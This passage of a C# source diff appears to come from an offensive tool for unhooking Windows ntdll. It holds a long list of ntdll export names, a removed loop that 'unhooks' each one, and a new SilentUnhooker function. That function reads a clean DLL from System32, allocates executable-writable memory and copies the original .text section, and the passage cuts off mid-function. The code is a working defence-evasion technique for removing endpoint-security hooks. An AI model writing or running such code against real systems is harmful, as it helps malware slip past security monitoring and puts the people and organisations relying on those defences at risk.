"RtlNewInstanceSecurityObject", "RtlNewSecurityGrantedAccess", "RtlNewSecurityObject", "RtlNewSecurityObjectEx", "RtlNewSecurityObjectWithMultipleInheritance", "RtlNormalizeProcessParams", "RtlNormalizeSecurityDescriptor", "RtlNormalizeString", "RtlNotifyFeatureUsage", "RtlNtPathNameToDosPathName", "RtlNtStatusToDosError", "RtlNtStatusToDosErrorNoTeb", "RtlNtdllName", "RtlNumberGenericTableElements", "RtlNumberGenericTableElementsAvl", "RtlNumberOfClearBits", "RtlNumberOfClearBitsEx", "RtlNumberOfClearBitsInRange", "RtlNumberOfSetBits", "RtlNumberOfSetBitsEx", "RtlNumberOfSetBitsInRange", "RtlNumberOfSetBitsUlongPtr", "RtlOemStringToUnicodeSize", "RtlOemStringToUnicodeString", "RtlOemToUnicodeN", "RtlOpenCurrentUser", "RtlOsDeploymentState", "RtlOwnerAcesPresent", "RtlPcToFileHeader", "RtlPinAtomInAtomTable", "RtlPopFrame", "RtlPrefixString", "RtlPrefixUnicodeString", "RtlPrepareForProcessCloning", "RtlProcessFlsData", "RtlProtectHeap", "RtlPublishWnfStateData", "RtlPushFrame", "RtlQueryActivationContextApplicationSettings", "RtlQueryAllFeatureConfigurations", "RtlQueryAtomInAtomTable", "RtlQueryCriticalSectionOwner", "RtlQueryDepthSList", "RtlQueryDynamicTimeZoneInformation", "RtlQueryElevationFlags", "RtlQueryEnvironmentVariable", "RtlQueryEnvironmentVariable_U", "RtlQueryFeatureConfiguration", "RtlQueryFeatureConfigurationChangeStamp", "RtlQueryFeatureUsageNotificationSubscriptions", "RtlQueryHeapInformation", "RtlQueryImageMitigationPolicy", "RtlQueryInformationAcl", "RtlQueryInformationActivationContext", "RtlQueryInformationActiveActivationContext", "RtlQueryInterfaceMemoryStream", "RtlQueryModuleInformation", "RtlQueryPackageClaims", "RtlQueryPackageIdentity", "RtlQueryPackageIdentityEx", "RtlQueryPerformanceCounter", "RtlQueryPerformanceFrequency", "RtlQueryProcessBackTraceInformation", "RtlQueryProcessDebugInformation", "RtlQueryProcessHeapInformation", "RtlQueryProcessLockInformation", "RtlQueryProcessPlaceholderCompatibilityMode", "RtlQueryProtectedPolicy", "RtlQueryRegistryValueWithFallback", "RtlQueryRegistryValues", "RtlQueryRegistryValuesEx", "RtlQueryResourcePolicy", "RtlQuerySecurityObject", "RtlQueryTagHeap", "RtlQueryThreadPlaceholderCompatibilityMode", "RtlQueryThreadProfiling", "RtlQueryTimeZoneInformation", "RtlQueryTokenHostIdAsUlong64", "RtlQueryUmsThreadInformation", "RtlQueryUnbiasedInterruptTime", "RtlQueryValidationRunlevel", "RtlQueryWnfMetaNotification", "RtlQueryWnfStateData", "RtlQueryWnfStateDataWithExplicitScope", "RtlQueueApcWow64Thread", "RtlQueueWorkItem", "RtlRaiseCustomSystemEventTrigger", "RtlRaiseException", "RtlRaiseExceptionForReturnAddressHijack", "RtlRaiseNoncontinuableException", "RtlRaiseStatus", "RtlRandom", "RtlRandomEx", "RtlRbInsertNodeEx", "RtlRbRemoveNode", "RtlReAllocateHeap", "RtlReadMemoryStream", "RtlReadOutOfProcessMemoryStream", "RtlReadThreadProfilingData", "RtlRealPredecessor", "RtlRealSuccessor", "RtlRegisterFeatureConfigurationChangeNotification", "RtlRegisterForWnfMetaNotification", "RtlRegisterSecureMemoryCacheCallback", "RtlRegisterThreadWithCsrss", "RtlRegisterWait", "RtlReleaseActivationContext", "RtlReleaseMemoryStream", "RtlReleasePath", "RtlReleasePebLock", "RtlReleasePrivilege", "RtlReleaseRelativeName", "RtlReleaseResource", "RtlReleaseSRWLockExclusive", "RtlReleaseSRWLockShared", "RtlRemoteCall", "RtlRemoveEntryHashTable", "RtlRemovePrivileges", "RtlRemoveVectoredContinueHandler", "RtlRemoveVectoredExceptionHandler", "RtlReplaceSidInSd", "RtlReplaceSystemDirectoryInPath", "RtlReportException", "RtlReportExceptionEx", "RtlReportSilentProcessExit", "RtlReportSqmEscalation", "RtlResetMemoryBlockLookaside", "RtlResetMemoryZone", "RtlResetNtUserPfn", "RtlResetRtlTranslations", "RtlRestoreBootStatusDefaults", "RtlRestoreContext", "RtlRestoreLastWin32Error", "RtlRestoreSystemBootStatusDefaults", "RtlRestoreThreadPreferredUILanguages", "RtlRetrieveNtUserPfn", "RtlRevertMemoryStream", "RtlRunDecodeUnicodeString", "RtlRunEncodeUnicodeString", "RtlRunOnceBeginInitialize", "RtlRunOnceComplete", "RtlRunOnceExecuteOnce", "RtlRunOnceInitialize", "RtlSecondsSince1970ToTime", "RtlSecondsSince1980ToTime", "RtlSeekMemoryStream", "RtlSelfRelativeToAbsoluteSD", "RtlSelfRelativeToAbsoluteSD2", "RtlSendMsgToSm", "RtlSetAllBits", "RtlSetAllBitsEx", "RtlSetAttributesSecurityDescriptor", "RtlSetBit", "RtlSetBitEx", "RtlSetBits", "RtlSetBitsEx", "RtlSetControlSecurityDescriptor", "RtlSetCriticalSectionSpinCount", "RtlSetCurrentDirectory_U", "RtlSetCurrentEnvironment", "RtlSetCurrentTransaction", "RtlSetDaclSecurityDescriptor", "RtlSetDynamicTimeZoneInformation", "RtlSetEnvironmentStrings", "RtlSetEnvironmentVar", "RtlSetEnvironmentVariable", "RtlSetExtendedFeaturesMask", "RtlSetFeatureConfigurations", "RtlSetGroupSecurityDescriptor", "RtlSetHeapInformation", "RtlSetImageMitigationPolicy", "RtlSetInformationAcl", "RtlSetIoCompletionCallback", "RtlSetLastWin32Error", "RtlSetLastWin32ErrorAndNtStatusFromNtStatus", "RtlSetMemoryStreamSize", "RtlSetOwnerSecurityDescriptor", "RtlSetPortableOperatingSystem", "RtlSetProcessDebugInformation", "RtlSetProcessIsCritical", "RtlSetProcessPlaceholderCompatibilityMode", "RtlSetProcessPreferredUILanguages", "RtlSetProtectedPolicy", "RtlSetProxiedProcessId", "RtlSetSaclSecurityDescriptor", "RtlSetSearchPathMode", "RtlSetSecurityDescriptorRMControl", "RtlSetSecurityObject", "RtlSetSecurityObjectEx", "RtlSetSystemBootStatus", "RtlSetSystemBootStatusEx", "RtlSetThreadErrorMode", "RtlSetThreadIsCritical", "RtlSetThreadPlaceholderCompatibilityMode", "RtlSetThreadPoolStartFunc", "RtlSetThreadPreferredUILanguages", "RtlSetThreadPreferredUILanguages2", "RtlSetThreadSubProcessTag", "RtlSetThreadWorkOnBehalfTicket", "RtlSetTimeZoneInformation", "RtlSetTimer", "RtlSetUmsThreadInformation", "RtlSetUnhandledExceptionFilter", "RtlSetUserFlagsHeap", "RtlSetUserValueHeap", "RtlSidDominates", "RtlSidDominatesForTrust", "RtlSidEqualLevel", "RtlSidHashInitialize", "RtlSidHashLookup", "RtlSidIsHigherLevel", "RtlSizeHeap", "RtlSleepConditionVariableCS", "RtlSleepConditionVariableSRW", "RtlSplay", "RtlStartRXact", "RtlStatMemoryStream", "RtlStringFromGUID", "RtlStringFromGUIDEx", "RtlStronglyEnumerateEntryHashTable", "RtlSubAuthorityCountSid", "RtlSubAuthoritySid", "RtlSubscribeForFeatureUsageNotification", "RtlSubscribeWnfStateChangeNotification", "RtlSubtreePredecessor", "RtlSubtreeSuccessor", "RtlSwitchedVVI", "RtlSystemTimeToLocalTime", "RtlTestAndPublishWnfStateData", "RtlTestBit", "RtlTestBitEx", "RtlTestProtectedAccess", "RtlTimeFieldsToTime", "RtlTimeToElapsedTimeFields", "RtlTimeToSecondsSince1970", "RtlTimeToSecondsSince1980", "RtlTimeToTimeFields", "RtlTraceDatabaseAdd", "RtlTraceDatabaseCreate", "RtlTraceDatabaseDestroy", "RtlTraceDatabaseEnumerate", "RtlTraceDatabaseFind", "RtlTraceDatabaseLock", "RtlTraceDatabaseUnlock", "RtlTraceDatabaseValidate", "RtlTryAcquirePebLock", "RtlTryAcquireSRWLockExclusive", "RtlTryAcquireSRWLockShared", "RtlTryConvertSRWLockSharedToExclusiveOrRelease", "RtlTryEnterCriticalSection", "RtlUTF8StringToUnicodeString", "RtlUTF8ToUnicodeN", "RtlUdiv128", "RtlUmsThreadYield", "RtlUnhandledExceptionFilter", "RtlUnhandledExceptionFilter2", "RtlUnicodeStringToAnsiSize", "RtlUnicodeStringToAnsiString", "RtlUnicodeStringToCountedOemString", "RtlUnicodeStringToInteger", "RtlUnicodeStringToOemSize", "RtlUnicodeStringToOemString", "RtlUnicodeStringToUTF8String", "RtlUnicodeToCustomCPN", "RtlUnicodeToMultiByteN", "RtlUnicodeToMultiByteSize", "RtlUnicodeToOemN", "RtlUnicodeToUTF8N", "RtlUniform", "RtlUnlockBootStatusData", "RtlUnlockCurrentThread", "RtlUnlockHeap", "RtlUnlockMemoryBlockLookaside", "RtlUnlockMemoryStreamRegion", "RtlUnlockMemoryZone", "RtlUnlockModuleSection", "RtlUnregisterFeatureConfigurationChangeNotification", "RtlUnsubscribeFromFeatureUsageNotifications", "RtlUnsubscribeWnfNotificationWaitForCompletion", "RtlUnsubscribeWnfNotificationWithCompletionCallback", "RtlUnsubscribeWnfStateChangeNotification", "RtlUnwind", "RtlUnwindEx", "RtlUpcaseUnicodeChar", "RtlUpcaseUnicodeString", "RtlUpcaseUnicodeStringToAnsiString", "RtlUpcaseUnicodeStringToCountedOemString", "RtlUpcaseUnicodeStringToOemString", "RtlUpcaseUnicodeToCustomCPN", "RtlUpcaseUnicodeToMultiByteN", "RtlUpcaseUnicodeToOemN", "RtlUpdateClonedCriticalSection", "RtlUpdateClonedSRWLock", "RtlUpdateTimer", "RtlUpperChar", "RtlUpperString", "RtlUserFiberStart", "RtlUserThreadStart", "RtlValidAcl", "RtlValidProcessProtection", "RtlValidRelativeSecurityDescriptor", "RtlValidSecurityDescriptor", "RtlValidSid", "RtlValidateCorrelationVector", "RtlValidateHeap", "RtlValidateProcessHeaps", "RtlValidateUnicodeString", "RtlVerifyVersionInfo", "RtlVirtualUnwind", "RtlWaitForWnfMetaNotification", "RtlWaitOnAddress", "RtlWakeAddressAll", "RtlWakeAddressAllNoFence", "RtlWakeAddressSingle", "RtlWakeAddressSingleNoFence", "RtlWakeAllConditionVariable", "RtlWakeConditionVariable", "RtlWalkFrameChain", "RtlWalkHeap", "RtlWeaklyEnumerateEntryHashTable", "RtlWerpReportException", "RtlWnfCompareChangeStamp", "RtlWnfDllUnloadCallback", "RtlWow64CallFunction64", "RtlWow64EnableFsRedirection", "RtlWow64EnableFsRedirectionEx", "RtlWow64GetCpuAreaInfo", "RtlWow64GetCurrentCpuArea", "RtlWow64GetCurrentMachine", "RtlWow64GetEquivalentMachineCHPE", "RtlWow64GetProcessMachines", "RtlWow64GetSharedInfoProcess", "RtlWow64GetThreadContext", "RtlWow64GetThreadSelectorEntry", "RtlWow64IsWowGuestMachineSupported", "RtlWow64LogMessageInEventLogger", "RtlWow64PopAllCrossProcessWorkFromWorkList", "RtlWow64PopCrossProcessWorkFromFreeList", "RtlWow64PushCrossProcessWorkOntoFreeList", "RtlWow64PushCrossProcessWorkOntoWorkList", "RtlWow64RequestCrossProcessHeavyFlush", "RtlWow64SetThreadContext", "RtlWow64SuspendProcess", "RtlWow64SuspendThread", "RtlWriteMemoryStream", "RtlWriteNonVolatileMemory", "RtlWriteRegistryValue", "RtlZeroHeap", "RtlZeroMemory", "RtlZombifyActivationContext", "RtlpApplyLengthFunction", "RtlpCheckDynamicTimeZoneInformation", "RtlpCleanupRegistryKeys", "RtlpConvertAbsoluteToRelativeSecurityAttribute", "RtlpConvertCultureNamesToLCIDs", "RtlpConvertLCIDsToCultureNames", "RtlpConvertRelativeToAbsoluteSecurityAttribute", "RtlpCreateProcessRegistryInfo", "RtlpEnsureBufferSize", "RtlpExecuteUmsThread", "RtlpFreezeTimeBias", "RtlpGetDeviceFamilyInfoEnum", "RtlpGetLCIDFromLangInfoNode", "RtlpGetNameFromLangInfoNode", "RtlpGetSystemDefaultUILanguage", "RtlpGetUserOrMachineUILanguage4NLS", "RtlpInitializeLangRegistryInfo", "RtlpIsQualifiedLanguage", "RtlpLoadMachineUIByPolicy", "RtlpLoadUserUIByPolicy", "RtlpMergeSecurityAttributeInformation", "RtlpMuiFreeLangRegistryInfo", "RtlpMuiRegCreateRegistryInfo", "RtlpMuiRegFreeRegistryInfo", "RtlpMuiRegLoadRegistryInfo", "RtlpNotOwnerCriticalSection", "RtlpNtCreateKey", "RtlpNtEnumerateSubKey", "RtlpNtMakeTemporaryKey", "RtlpNtOpenKey", "RtlpNtQueryValueKey", "RtlpNtSetValueKey", "RtlpQueryDefaultUILanguage", "RtlpQueryProcessDebugInformationFromWow64", "RtlpQueryProcessDebugInformationRemote", "RtlpRefreshCachedUILanguage", "RtlpSetInstallLanguage", "RtlpSetPreferredUILanguages", "RtlpSetUserPreferredUILanguages", "RtlpTimeFieldsToTime", "RtlpTimeToTimeFields", "RtlpUmsExecuteYieldThreadEnd", "RtlpUmsThreadYield", "RtlpUnWaitCriticalSection", "RtlpVerifyAndCommitUILanguageSettings", "RtlpWaitForCriticalSection", "RtlpWow64CtxFromAmd64", "RtlpWow64GetContextOnAmd64", "RtlpWow64SetContextOnAmd64", "RtlxAnsiStringToUnicodeSize", "RtlxOemStringToUnicodeSize", "RtlxUnicodeStringToAnsiSize", "RtlxUnicodeStringToOemSize", "SbExecuteProcedure", "SbSelectProcedure", "TpAllocAlpcCompletion", "TpAllocAlpcCompletionEx", "TpAllocCleanupGroup", "TpAllocIoCompletion", "TpAllocJobNotification", "TpAllocPool", "TpAllocTimer", "TpAllocWait", "TpAllocWork", "TpAlpcRegisterCompletionList", "TpAlpcUnregisterCompletionList", "TpCallbackDetectedUnrecoverableError", "TpCallbackIndependent", "TpCallbackLeaveCriticalSectionOnCompletion", "TpCallbackMayRunLong", "TpCallbackReleaseMutexOnCompletion", "TpCallbackReleaseSemaphoreOnCompletion", "TpCallbackSendAlpcMessageOnCompletion", "TpCallbackSendPendingAlpcMessage", "TpCallbackSetEventOnCompletion", "TpCallbackUnloadDllOnCompletion", "TpCancelAsyncIoOperation", "TpCaptureCaller", "TpCheckTerminateWorker", "TpDbgDumpHeapUsage", "TpDbgSetLogRoutine", "TpDisablePoolCallbackChecks", "TpDisassociateCallback", "TpIsTimerSet", "TpPostWork", "TpQueryPoolStackInformation", "TpReleaseAlpcCompletion", "TpReleaseCleanupGroup", "TpReleaseCleanupGroupMembers", "TpReleaseIoCompletion", "TpReleaseJobNotification", "TpReleasePool", "TpReleaseTimer", "TpReleaseWait", "TpReleaseWork", "TpSetDefaultPoolMaxThreads", "TpSetDefaultPoolStackInformation", "TpSetPoolMaxThreads", "TpSetPoolMaxThreadsSoftLimit", "TpSetPoolMinThreads", "TpSetPoolStackInformation", "TpSetPoolThreadBasePriority", "TpSetPoolThreadCpuSets", "TpSetPoolWorkerThreadIdleTimeout", "TpSetTimer", "TpSetTimerEx", "TpSetWait", "TpSetWaitEx", "ZwAcceptConnectPort", "ZwAccessCheck", "ZwAccessCheckAndAuditAlarm", "ZwAccessCheckByType", "ZwAccessCheckByTypeAndAuditAlarm", "ZwAccessCheckByTypeResultList", "ZwAccessCheckByTypeResultListAndAuditAlarm", "ZwAccessCheckByTypeResultListAndAuditAlarmByHandle", "ZwAcquireCrossVmMutant", "ZwAcquireProcessActivityReference", "ZwAddAtom", "ZwAddAtomEx", "ZwAddBootEntry", "ZwAddDriverEntry", "ZwAdjustGroupsToken", "ZwAdjustPrivilegesToken", "ZwAdjustTokenClaimsAndDeviceGroups", "ZwAlertResumeThread", "ZwAlertThread", "ZwAlertThreadByThreadId", "ZwAllocateLocallyUniqueId", "ZwAllocateReserveObject", "ZwAllocateUserPhysicalPages", "ZwAllocateUserPhysicalPagesEx", "ZwAllocateUuids", "ZwAllocateVirtualMemory", "ZwAllocateVirtualMemoryEx", "ZwAlpcAcceptConnectPort", "ZwAlpcCancelMessage", "ZwAlpcConnectPort", "ZwAlpcConnectPortEx", "ZwAlpcCreatePort", "ZwAlpcCreatePortSection", "ZwAlpcCreateResourceReserve", "ZwAlpcCreateSectionView", "ZwAlpcCreateSecurityContext", "ZwAlpcDeletePortSection", "ZwAlpcDeleteResourceReserve", "ZwAlpcDeleteSectionView", "ZwAlpcDeleteSecurityContext", "ZwAlpcDisconnectPort", "ZwAlpcImpersonateClientContainerOfPort", "ZwAlpcImpersonateClientOfPort", "ZwAlpcOpenSenderProcess", "ZwAlpcOpenSenderThread", "ZwAlpcQueryInformation", "ZwAlpcQueryInformationMessage", "ZwAlpcRevokeSecurityContext", "ZwAlpcSendWaitReceivePort", "ZwAlpcSetInformation", "ZwApphelpCacheControl", "ZwAreMappedFilesTheSame", "ZwAssignProcessToJobObject", "ZwAssociateWaitCompletionPacket", "ZwCallEnclave", "ZwCallbackReturn", "ZwCancelIoFile", "ZwCancelIoFileEx", "ZwCancelSynchronousIoFile", "ZwCancelTimer", "ZwCancelTimer2", "ZwCancelWaitCompletionPacket", "ZwClearEvent", "ZwClose", "ZwCloseObjectAuditAlarm", "ZwCommitComplete", "ZwCommitEnlistment", "ZwCommitRegistryTransaction", "ZwCommitTransaction", "ZwCompactKeys", "ZwCompareObjects", "ZwCompareSigningLevels", "ZwCompareTokens", "ZwCompleteConnectPort", "ZwCompressKey", "ZwConnectPort", "ZwContinue", "ZwContinueEx", "ZwConvertBetweenAuxiliaryCounterAndPerformanceCounter", "ZwCreateCrossVmEvent", "ZwCreateCrossVmMutant", "ZwCreateDebugObject", "ZwCreateDirectoryObject", "ZwCreateDirectoryObjectEx", "ZwCreateEnclave", "ZwCreateEnlistment", "ZwCreateEvent", "ZwCreateEventPair", "ZwCreateFile", "ZwCreateIRTimer", "ZwCreateIoCompletion", "ZwCreateJobObject", "ZwCreateJobSet", "ZwCreateKey", "ZwCreateKeyTransacted", "ZwCreateKeyedEvent", "ZwCreateLowBoxToken", "ZwCreateMailslotFile", "ZwCreateMutant", "ZwCreateNamedPipeFile", "ZwCreatePagingFile", "ZwCreatePartition", "ZwCreatePort", "ZwCreatePrivateNamespace", "ZwCreateProcess", "ZwCreateProcessEx", "ZwCreateProfile", "ZwCreateProfileEx", "ZwCreateRegistryTransaction", "ZwCreateResourceManager", "ZwCreateSection", "ZwCreateSectionEx", "ZwCreateSemaphore", "ZwCreateSymbolicLinkObject", "ZwCreateThread", "ZwCreateThreadEx", "ZwCreateTimer", "ZwCreateTimer2", "ZwCreateToken", "ZwCreateTokenEx", "ZwCreateTransaction", "ZwCreateTransactionManager", "ZwCreateUserProcess", "ZwCreateWaitCompletionPacket", "ZwCreateWaitablePort", "ZwCreateWnfStateName", "ZwCreateWorkerFactory", "ZwDebugActiveProcess", "ZwDebugContinue", "ZwDelayExecution", "ZwDeleteAtom", "ZwDeleteBootEntry", "ZwDeleteDriverEntry", "ZwDeleteFile", "ZwDeleteKey", "ZwDeleteObjectAuditAlarm", "ZwDeletePrivateNamespace", "ZwDeleteValueKey", "ZwDeleteWnfStateData", "ZwDeleteWnfStateName", "ZwDeviceIoControlFile", "ZwDirectGraphicsCall", "ZwDisableLastKnownGood", "ZwDisplayString", "ZwDrawText", "ZwDuplicateObject", "ZwDuplicateToken", "ZwEnableLastKnownGood", "ZwEnumerateBootEntries", "ZwEnumerateDriverEntries", "ZwEnumerateKey", "ZwEnumerateSystemEnvironmentValuesEx", "ZwEnumerateTransactionObject", "ZwEnumerateValueKey", "ZwExtendSection", "ZwFilterBootOption", "ZwFilterToken", "ZwFilterTokenEx", "ZwFindAtom", "ZwFlushBuffersFile", "ZwFlushBuffersFileEx", "ZwFlushInstallUILanguage", "ZwFlushInstructionCache", "ZwFlushKey", "ZwFlushProcessWriteBuffers", "ZwFlushVirtualMemory", "ZwFlushWriteBuffer", "ZwFreeUserPhysicalPages", "ZwFreeVirtualMemory", "ZwFreezeRegistry", "ZwFreezeTransactions", "ZwFsControlFile", "ZwGetCachedSigningLevel", "ZwGetCompleteWnfStateSubscription", "ZwGetContextThread", "ZwGetCurrentProcessorNumber", "ZwGetCurrentProcessorNumberEx", "ZwGetDevicePowerState", "ZwGetMUIRegistryInfo", "ZwGetNextProcess", "ZwGetNextThread", "ZwGetNlsSectionPtr", "ZwGetNotificationResourceManager", "ZwGetWriteWatch", "ZwImpersonateAnonymousToken", "ZwImpersonateClientOfPort", "ZwImpersonateThread", "ZwInitializeEnclave", "ZwInitializeNlsFiles", "ZwInitializeRegistry", "ZwInitiatePowerAction", "ZwIsProcessInJob", "ZwIsSystemResumeAutomatic", "ZwIsUILanguageComitted", "ZwListenPort", "ZwLoadDriver", "ZwLoadEnclaveData", "ZwLoadKey", "ZwLoadKey2", "ZwLoadKey3", "ZwLoadKeyEx", "ZwLockFile", "ZwLockProductActivationKeys", "ZwLockRegistryKey", "ZwLockVirtualMemory", "ZwMakePermanentObject", "ZwMakeTemporaryObject", "ZwManageHotPatch", "ZwManagePartition", "ZwMapCMFModule", "ZwMapUserPhysicalPages", "ZwMapUserPhysicalPagesScatter", "ZwMapViewOfSection", "ZwMapViewOfSectionEx", "ZwModifyBootEntry", "ZwModifyDriverEntry", "ZwNotifyChangeDirectoryFile", "ZwNotifyChangeDirectoryFileEx", "ZwNotifyChangeKey", "ZwNotifyChangeMultipleKeys", "ZwNotifyChangeSession", "ZwOpenDirectoryObject", "ZwOpenEnlistment", "ZwOpenEvent", "ZwOpenEventPair", "ZwOpenFile", "ZwOpenIoCompletion", "ZwOpenJobObject", "ZwOpenKey", "ZwOpenKeyEx", "ZwOpenKeyTransacted", "ZwOpenKeyTransactedEx", "ZwOpenKeyedEvent", "ZwOpenMutant", "ZwOpenObjectAuditAlarm", "ZwOpenPartition", "ZwOpenPrivateNamespace", "ZwOpenProcess", "ZwOpenProcessToken", "ZwOpenProcessTokenEx", "ZwOpenRegistryTransaction", "ZwOpenResourceManager", "ZwOpenSection", "ZwOpenSemaphore", "ZwOpenSession", "ZwOpenSymbolicLinkObject", "ZwOpenThread", "ZwOpenThreadToken", "ZwOpenThreadTokenEx", "ZwOpenTimer", "ZwOpenTransaction", "ZwOpenTransactionManager", "ZwPlugPlayControl", "ZwPowerInformation", "ZwPrePrepareComplete", "ZwPrePrepareEnlistment", "ZwPrepareComplete", "ZwPrepareEnlistment", "ZwPrivilegeCheck", "ZwPrivilegeObjectAuditAlarm", "ZwPrivilegedServiceAuditAlarm", "ZwPropagationComplete", "ZwPropagationFailed", "ZwProtectVirtualMemory", "ZwPssCaptureVaSpaceBulk", "ZwPulseEvent", "ZwQueryAttributesFile", "ZwQueryAuxiliaryCounterFrequency", "ZwQueryBootEntryOrder", "ZwQueryBootOptions", "ZwQueryDebugFilterState", "ZwQueryDefaultLocale", "ZwQueryDefaultUILanguage", "ZwQueryDirectoryFile", "ZwQueryDirectoryFileEx", "ZwQueryDirectoryObject", "ZwQueryDriverEntryOrder", "ZwQueryEaFile", "ZwQueryEvent", "ZwQueryFullAttributesFile", "ZwQueryInformationAtom", "ZwQueryInformationByName", "ZwQueryInformationEnlistment", "ZwQueryInformationFile", "ZwQueryInformationJobObject", "ZwQueryInformationPort", "ZwQueryInformationProcess", "ZwQueryInformationResourceManager", "ZwQueryInformationThread", "ZwQueryInformationToken", "ZwQueryInformationTransaction", "ZwQueryInformationTransactionManager", "ZwQueryInformationWorkerFactory", "ZwQueryInstallUILanguage", "ZwQueryIntervalProfile", "ZwQueryIoCompletion", "ZwQueryKey", "ZwQueryLicenseValue", "ZwQueryMultipleValueKey", "ZwQueryMutant", "ZwQueryObject", "ZwQueryOpenSubKeys", "ZwQueryOpenSubKeysEx", "ZwQueryPerformanceCounter", "ZwQueryPortInformationProcess", "ZwQueryQuotaInformationFile", "ZwQuerySection", "ZwQuerySecurityAttributesToken", "ZwQuerySecurityObject", "ZwQuerySecurityPolicy", "ZwQuerySemaphore", "ZwQuerySymbolicLinkObject", "ZwQuerySystemEnvironmentValue", "ZwQuerySystemEnvironmentValueEx", "ZwQuerySystemInformation", "ZwQuerySystemInformationEx", "ZwQuerySystemTime", "ZwQueryTimer", "ZwQueryTimerResolution", "ZwQueryValueKey", "ZwQueryVirtualMemory", "ZwQueryVolumeInformationFile", "ZwQueryWnfStateData", "ZwQueryWnfStateNameInformation", "ZwQueueApcThread", "ZwQueueApcThreadEx", "ZwRaiseException", "ZwRaiseHardError", "ZwReadFile", "ZwReadFileScatter", "ZwReadOnlyEnlistment", "ZwReadRequestData", "ZwReadVirtualMemory", "ZwRecoverEnlistment", "ZwRecoverResourceManager", "ZwRecoverTransactionManager", "ZwRegisterProtocolAddressInformation", "ZwRegisterThreadTerminatePort", "ZwReleaseKeyedEvent", "ZwReleaseMutant", "ZwReleaseSemaphore", "ZwReleaseWorkerFactoryWorker", "ZwRemoveIoCompletion", "ZwRemoveIoCompletionEx", "ZwRemoveProcessDebug", "ZwRenameKey", "ZwRenameTransactionManager", "ZwReplaceKey", "ZwReplacePartitionUnit", "ZwReplyPort", "ZwReplyWaitReceivePort", "ZwReplyWaitReceivePortEx", "ZwReplyWaitReplyPort", "ZwRequestPort", "ZwRequestWaitReplyPort", "ZwResetEvent", "ZwResetWriteWatch", "ZwRestoreKey", "ZwResumeProcess", "ZwResumeThread", "ZwRevertContainerImpersonation", "ZwRollbackComplete", "ZwRollbackEnlistment", "ZwRollbackRegistryTransaction", "ZwRollbackTransaction", "ZwRollforwardTransactionManager", "ZwSaveKey", "ZwSaveKeyEx", "ZwSaveMergedKeys", "ZwSecureConnectPort", "ZwSerializeBoot", "ZwSetBootEntryOrder", "ZwSetBootOptions", "ZwSetCachedSigningLevel", "ZwSetCachedSigningLevel2", "ZwSetContextThread", "ZwSetDebugFilterState", "ZwSetDefaultHardErrorPort", "ZwSetDefaultLocale", "ZwSetDefaultUILanguage", "ZwSetDriverEntryOrder", "ZwSetEaFile", "ZwSetEvent", "ZwSetEventBoostPriority", "ZwSetHighEventPair", "ZwSetHighWaitLowEventPair", "ZwSetIRTimer", "ZwSetInformationDebugObject", "ZwSetInformationEnlistment", "ZwSetInformationFile", "ZwSetInformationJobObject", "ZwSetInformationKey", "ZwSetInformationObject", "ZwSetInformationProcess", "ZwSetInformationResourceManager", "ZwSetInformationSymbolicLink", "ZwSetInformationThread", "ZwSetInformationToken", "ZwSetInformationTransaction", "ZwSetInformationTransactionManager", "ZwSetInformationVirtualMemory", "ZwSetInformationWorkerFactory", "ZwSetIntervalProfile", "ZwSetIoCompletion", "ZwSetIoCompletionEx", "ZwSetLdtEntries", "ZwSetLowEventPair", "ZwSetLowWaitHighEventPair", "ZwSetQuotaInformationFile", "ZwSetSecurityObject", "ZwSetSystemEnvironmentValue", "ZwSetSystemEnvironmentValueEx", "ZwSetSystemInformation", "ZwSetSystemPowerState", "ZwSetSystemTime", "ZwSetThreadExecutionState", "ZwSetTimer", "ZwSetTimer2", "ZwSetTimerEx", "ZwSetTimerResolution", "ZwSetUuidSeed", "ZwSetValueKey", "ZwSetVolumeInformationFile", "ZwSetWnfProcessNotificationEvent", "ZwShutdownSystem", "ZwShutdownWorkerFactory", "ZwSignalAndWaitForSingleObject", "ZwSinglePhaseReject", "ZwStartProfile", "ZwStopProfile", "ZwSubscribeWnfStateChange", "ZwSuspendProcess", "ZwSuspendThread", "ZwSystemDebugControl", "ZwTerminateEnclave", "ZwTerminateJobObject", "ZwTerminateProcess", "ZwTerminateThread", "ZwTestAlert", "ZwThawRegistry", "ZwThawTransactions", "ZwTraceControl", "ZwTraceEvent", "ZwTranslateFilePath", "ZwUmsThreadYield", "ZwUnloadDriver", "ZwUnloadKey", "ZwUnloadKey2", "ZwUnloadKeyEx", "ZwUnlockFile", "ZwUnlockVirtualMemory", "ZwUnmapViewOfSection", "ZwUnmapViewOfSectionEx", "ZwUnsubscribeWnfStateChange", "ZwUpdateWnfStateData", "ZwVdmControl", "ZwWaitForAlertByThreadId", "ZwWaitForDebugEvent", "ZwWaitForKeyedEvent", "ZwWaitForMultipleObjects", "ZwWaitForMultipleObjects32", "ZwWaitForSingleObject", "ZwWaitForWorkViaWorkerFactory", "ZwWaitHighEventPair", "ZwWaitLowEventPair", "ZwWorkerFactoryWorkerReady", "ZwWriteFile", "ZwWriteFileGather", "ZwWriteRequestData", "ZwWriteVirtualMemory", "ZwYieldExecution", "memchr", "memcmp", "memcpy", "memcpy_s", "memmove", "memmove_s", "memset"};
-    	for (int i = 0; i < (NTAPIs.Count()); i++) {
-    		Console.WriteLine(String.Format("Unhooking {0}...", NTAPIs[i]));
-    		UnhookNTSilent(NTAPIs[i]);
+
+    public static void SilentUnhooker(string DLLname) {
+    	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
+    	bool thisis64bit;
+    	if (IntPtr.Size == 4) {
+			thisis64bit = false;
+		}else {
+			thisis64bit = true;
+		}
+    	// get original .text section from original DLL
+    	string DLLfile = (@"C:\Windows\System32\" + DLLname);
+    	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLfile);
+        PEReader OriginalDLL = new PEReader(DLLBytes);
+        // just to be safe,i allocate as big as the DLL :')
+        IntPtr codebase;
+        if (thisis64bit) {
+	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);        	
+        }else {
+	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        }
+        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
+            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
+            	// read and copy .text section
+                IntPtr byteLocationOnMemory = VirtualAlloc(IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
